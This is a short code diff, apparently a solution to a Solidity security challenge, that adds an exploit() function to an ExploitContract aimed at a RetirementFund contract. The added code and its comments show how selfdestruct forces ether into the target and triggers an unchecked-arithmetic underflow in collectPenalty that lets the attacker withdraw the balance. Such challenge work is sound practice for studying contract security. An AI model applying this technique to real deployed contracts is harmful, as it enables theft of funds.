@@ -56,6 +56,14 @@ contract ExploitContract {
     constructor(RetirementFund _retirementFund) {
         retirementFund = _retirementFund;
     }
+    // calling self destruct on this exploit contract will transfer its funds to the destination parameter, in this case the target contract
+    // using this hack we can force the target to receive addition ether even thought it does not have a `receive()` or `fallback` function
+    // when we do this, the target, which only tracks balance via a startBalance variable, will not be updated despite address(this).balance being updated
+    // Thus, on the next call to collectPenalty, the withdrawn amount which is updated via unchecked arithmetic will under flow causing withdrawn to be a very larg value
+    // since we are entitle to withdraw the balance of this contract when withdrawn is > 0, this underflow is very consequential
+    function exploit() public payable {
+        selfdestruct(payable(address(retirementFund)));
+    }
 
     // write your exploit functions below
 }
